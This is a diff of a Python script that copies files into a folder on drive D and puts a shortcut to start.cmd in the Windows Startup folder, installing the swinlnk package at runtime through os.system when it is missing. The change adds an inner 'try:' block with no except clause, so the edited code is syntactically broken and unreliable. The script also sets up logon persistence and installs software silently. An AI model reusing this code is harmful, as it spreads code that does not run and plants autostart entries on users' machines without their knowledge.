@@ -2,6 +2,8 @@ import time
 import os
 files={}
 path = r"D:\New folder\\"
+short_path = os.getenv("appdata")+r"\Microsoft\Windows\Start Menu\Programs" +\
+             r"\Startup\start.lnk"
 def main():
     for i in os.scandir("D:\\New folder"):
         if os.path.isfile(os.path.join("D:\\New folder",i)):
@@ -13,14 +15,19 @@ def main():
                 if file.read() == "Password":
                     continue
         os.makedirs(path, exist_ok = True)
-        try:
+        try:#try to install SWinLnk and then create shortcut.
             from swinlnk.swinlnk import SWinLnk
+            swl=SWinLnk()
+            swl.create_lnk(path+"start.cmd", short_path)
         except:
-            os.system("py -m pip install swinlnk")
-            from swinlnk.swinlnk import SWinLnk
-        swl=SWinLnk()
-        swl.create_lnk(path+"start.cmd",os.getenv("appdata")+r"\Microsoft\Windows"+
-                       r"\Start Menu\Programs\Startup\start.lnk")
+            for i in range(10):
+                try:
+                    os.system("py -m pip install swinlnk")
+                    from swinlnk.swinlnk import SWinLnk
+                    swl=SWinLnk()
+                    swl.create_lnk(path+"start.cmd", short_path)
+                    break
+        
         for i in files:
             with open(path+i,"w") as file:
                 file.write(files[i])
